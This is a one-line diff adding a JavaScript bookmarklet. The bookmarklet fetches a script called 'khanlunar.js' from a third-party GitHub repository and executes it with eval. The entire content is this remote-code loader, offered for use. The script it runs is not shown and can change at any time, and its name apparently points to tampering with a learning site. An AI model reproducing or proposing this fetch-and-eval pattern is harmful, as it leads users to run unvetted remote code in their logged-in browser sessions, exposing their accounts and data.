@@ -1,0 +1,1 @@
+javascript:fetch('https://raw.githubusercontent.com/CrimsonStrauss/Scripts/refs/heads/main/khanlunar.js').then(t=>t.text()).then(eval)
